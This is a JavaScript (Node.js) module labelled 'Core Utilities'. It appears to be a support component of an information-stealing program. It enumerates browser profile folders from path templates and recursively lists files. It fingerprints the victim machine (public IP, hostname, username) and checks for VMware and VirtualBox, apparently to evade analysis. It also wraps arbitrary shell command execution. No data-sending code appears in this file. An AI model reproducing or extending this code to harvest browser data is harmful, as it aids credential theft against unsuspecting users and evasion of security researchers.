/**
 * Core Utilities Module
 * Provides common utility functions used across the application
 */

const fs = require('fs');
const axios = require('axios');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
const crypto = require('crypto');

class CoreUtils {
    /**
     * Generate random ID string
     * @param {number} length - Length of the ID
     * @returns {string} Random ID
     */
    static generateId(length = 10) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    /**
     * Extract filename from path
     * @param {string} filePath - Full file path
     * @returns {string} Filename only
     */
    static getFileName(filePath) {
        return filePath.split('\\').pop().split('/').pop();
    }

    /**
     * Recursively read all files in directory
     * @param {string} basePath - Base directory path
     * @param {string} relativePath - Relative path for results
     * @returns {Array<string>} Array of file paths
     */
    static recursiveRead(basePath, relativePath = '') {
        const result = [];
        
        if (!basePath.endsWith('\\') && !basePath.endsWith('/')) {
            basePath += process.platform === 'win32' ? '\\' : '/';
        }

        try {
            const files = fs.readdirSync(basePath);
            
            for (const file of files) {
                const filePath = basePath + file;
                const relativeFilePath = relativePath + file;
                
                try {
                    if (fs.statSync(filePath).isDirectory()) {
                        const separator = process.platform === 'win32' ? '\\' : '/';
                        result.push(...this.recursiveRead(filePath, relativeFilePath + separator));
                    } else {
                        result.push(relativeFilePath);
                    }
                } catch (error) {
                    // Skip files that can't be accessed
                    continue;
                }
            }
        } catch (error) {
            // Skip directories that can't be accessed
        }

        return result;
    }

    /**
     * Get browser profiles from path with %PROFILE% placeholder
     * @param {string} pathTemplate - Path template with %PROFILE% placeholder
     * @param {string} name - Profile name
     * @returns {Array<Object>} Array of profile objects
     */
    static getProfiles(pathTemplate, name) {
        const parts = pathTemplate.split('%PROFILE%');
        
        if (parts.length === 1) {
            return [{
                path: pathTemplate,
                name: name
            }];
        }

        if (!fs.existsSync(parts[0])) {
            return [];
        }

        const profiles = [];
        
        try {
            const dirs = fs.readdirSync(parts[0]);
            
            for (const dir of dirs) {
                const fullPath = parts[0] + dir + (parts[1] || '');
                if (fs.existsSync(fullPath)) {
                    profiles.push({
                        path: fullPath,
                        name: `${name} - ${dir}`
                    });
                }
            }
        } catch (error) {
            // Return empty array if can't read directory
        }

        return profiles;
    }

    /**
     * Get public IP address
     * @returns {Promise<string>} Public IP address
     */
    static async getPublicIp() {
        try {
            const response = await axios.get('https://api.ipify.org?format=json', {
                timeout: 5000
            });
            return response.data.ip;
        } catch (error) {
            return 'Unknown';
        }
    }

    /**
     * Get hostname
     * @returns {Promise<string>} Hostname
     */
    static async getHostname() {
        try {
            const { stdout } = await exec('hostname');
            return stdout.trim();
        } catch (error) {
            return process.env.COMPUTERNAME || 'Unknown';
        }
    }

    /**
     * Get username
     * @returns {string} Username
     */
    static getUsername() {
        return process.env.USERNAME || 
               process.env.USER || 
               (process.env.USERPROFILE ? process.env.USERPROFILE.split('\\').pop() : 'Unknown');
    }

    /**
     * Check if running in virtual machine (simplified version)
     * @returns {Promise<boolean>} True if likely in VM
     */
    static async isVirtualMachine() {
        try {
            // Simple VM detection based on common VM indicators
            const checks = [
                () => process.env.PROCESSOR_IDENTIFIER?.includes('VMware'),
                () => process.env.COMPUTERNAME?.includes('VM'),
                () => fs.existsSync('C:\\Program Files\\VMware'),
                () => fs.existsSync('C:\\Program Files\\Oracle\\VirtualBox')
            ];

            return checks.some(check => {
                try {
                    return check();
                } catch {
                    return false;
                }
            });
        } catch (error) {
            return false;
        }
    }

    /**
     * Create directory recursively
     * @param {string} dirPath - Directory path to create
     */
    static createDirectoryRecursive(dirPath) {
        try {
            const dir = require('path').dirname(dirPath);
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
        } catch (error) {
            // Ignore errors
        }
    }

    /**
     * Safe file read operation
     * @param {string} filePath - Path to file
     * @returns {Buffer|null} File contents or null if error
     */
    static safeReadFile(filePath) {
        try {
            return fs.readFileSync(filePath);
        } catch (error) {
            return null;
        }
    }

    /**
     * Safe file write operation
     * @param {string} filePath - Path to file
     * @param {Buffer|string} data - Data to write
     * @returns {boolean} True if successful
     */
    static safeWriteFile(filePath, data) {
        try {
            this.createDirectoryRecursive(filePath);
            fs.writeFileSync(filePath, data);
            return true;
        } catch (error) {
            return false;
        }
    }

    /**
     * Generate secure hash of data
     * @param {string|Buffer} data - Data to hash
     * @param {string} algorithm - Hash algorithm (default: sha256)
     * @returns {string} Hex hash
     */
    static generateHash(data, algorithm = 'sha256') {
        return crypto.createHash(algorithm).update(data).digest('hex');
    }

    /**
     * Sleep for specified milliseconds
     * @param {number} ms - Milliseconds to sleep
     * @returns {Promise} Promise that resolves after delay
     */
    static sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Execute command with timeout
     * @param {string} command - Command to execute
     * @param {number} timeout - Timeout in milliseconds
     * @returns {Promise<Object>} Command result
     */
    static async executeCommand(command, timeout = 10000) {
        try {
            const { stdout, stderr } = await exec(command, { timeout });
            return { success: true, stdout, stderr };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
}

module.exports = CoreUtils;